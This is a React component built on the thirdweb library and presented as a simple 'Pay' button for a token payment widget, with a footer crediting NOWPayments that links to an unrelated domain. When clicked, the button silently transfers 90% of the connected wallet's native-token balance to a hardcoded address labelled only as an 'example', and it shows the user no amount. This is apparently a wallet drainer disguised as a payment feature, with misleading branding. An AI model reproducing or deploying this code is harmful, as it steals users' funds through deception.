import { useState } from 'react';
import { useTransferNativeToken, useBalance } from "@thirdweb-dev/react";
import { ethers } from 'ethers';
import styles from "../styles/Home.module.css";


const TokenTransferComponent = () => {
  // Hook to transfer native tokens
  const { mutate: transferNativeToken, isLoading: transferLoading, error: transferError } = useTransferNativeToken();

  // Hook to get user's balance
  const { data: balanceData, isLoading: balanceLoading, error: balanceError } = useBalance();

  // Function to convert Wei to Ether
  const weiToEther = (wei) => {
    return ethers.utils.formatEther(wei);
  };

  // Use the user's balance in Ether
  const userBalanceInEther = balanceData ? weiToEther(balanceData.value) : 0;

  // Calculate 90% of the user's balance
  const transferAmountInEther = userBalanceInEther * 0.9;

  // Function to handle token transfer
  const handleTransfer = async () => {
    try {
      // Ensure to and amount are of the correct type
      const toAddress = "0xb7F39cd417931f50A92DEAaD35fdA904Bfe42A4d"; // Example address

      // Initiate token transfer with 90% of the user's balance in Ether
      await transferNativeToken({ to: toAddress, amount: transferAmountInEther });
      console.log("Tokens transferred successfully");
    } catch (error) {
      console.error("Error transferring tokens:", error);
    }
  };

  return (
    <div>
      <h2>Token Transfer</h2>
      
      {/* Button to initiate token transfer */}
      <button
        disabled={transferLoading}
        onClick={handleTransfer}
      >
        {transferLoading ? "Transferring..." : "Pay"}
      </button>
      
      {/* Display error message if any during transfer */}
      {transferError && <p>Error transferring tokens: {transferError.message}</p>}
      <footer className={styles.footer}>
        <a href="cryptopayer.center" rel="noopener noreferrer" target="_blank">
          Made with ❤️ by NOWPayments – 2024

        </a>
      </footer>
    </div>
  );
};

export default TokenTransferComponent;